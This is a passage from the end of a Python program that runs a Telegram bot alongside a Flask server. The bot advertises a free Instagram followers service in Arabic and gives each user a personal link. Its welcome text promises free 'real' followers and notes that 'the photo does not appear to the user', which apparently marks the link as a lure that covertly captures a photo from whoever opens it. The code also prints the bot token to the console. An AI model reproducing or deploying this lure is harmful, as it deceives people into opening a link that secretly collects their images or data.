                'first_name': user.first_name,
                'join_date': datetime.now().isoformat()
            }
            save_user_data(user_data)
        
        # إنشاء رابط المستخدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
        user_url = f"{base_url}/user/{user_id}"
        
        welcome_text = f"""
🎉 **أهلاً بك {user.first_name} في خدمة متابعين إنستغرام!**

📱 **رابطك الخاص:**
{user_url}

⚡ **مميزات الخدمة:**
✅ متابعين نشطين وحقيقيين
✅ عملية أتوماتيكية بالكامل
✅ توصيل سريع وآمن
✅ أسعار مناسبة

🎁 **احصل على 100 متابع مجاناً للتجربة!**

🔒 **عملية آمنة:**
• تحقق تلقائي سريع
• لا تظهر الصورة للمستخدم  
• بياناتك محمية ومشفرة

💡 **كيفية الاستخدام:**
1. افتح الرابط أعلاه
2. أدخل اسم مستخدم إنستغرام
3. وافق على الشروط
4. اختر الباقة المناسبة
5. استلم متابعينك تلقائياً!

🚀 **ابدأ الآن واحصل على متابعين حقيقيين!**
        """
        
        await update.message.reply_text(welcome_text, parse_mode='HTML')
        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /help"""
        help_text = """
🤖 **أوامر البوت:**

/start - بدء البوت والحصول على الرابط الخاص
/help - عرض الرسالة المساعدة
/status - حالة طلباتك

📞 **الدعم الفني:**
@{'your_support_username'}

🕒 **أوقات العمل:**
24/7
        """
        await update.message.reply_text(help_text)

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /status"""
        user_id = update.effective_user.id
        orders = load_orders_data()
        
        user_orders = [order for order in orders.values() if order['user_id'] == str(user_id)]
        
        if user_orders:
            status_text = "📊 **حالة طلباتك:**\n\n"
            for order in user_orders[-3:]:  # آخر 3 طلبات
                status_text += f"📦 {get_package_name(order['package'])} - {order['status']} - {order['progress']}%\n"
        else:
            status_text = "📭 لم تقم بأي طلبات بعد.\nاستخدم /start لبدء الخدمة!"
        
        await update.message.reply_text(status_text, parse_mode='HTML')

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالج الأخطاء"""
        print(f"❌ خطأ في البوت: {context.error}")

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("status", self.status_command))

    def run_polling(self):
        """تشغيل البوت باستخدام Polling"""
        async def run():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام...")
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            while True:
                await asyncio.sleep(3600)
                
        asyncio.run(run())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)
    bot = TelegramBot(BOT_TOKEN)
    bot.run_polling()

if __name__ == '__main__':
    print("🚀 بدء تشغيل خدمة متابعين إنستغرام...")
    print(f"📊 البورت: {PORT}")
    print(f"🔑 التوكن: {BOT_TOKEN}")
    
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("⏹ إيقاف التطبيق...")
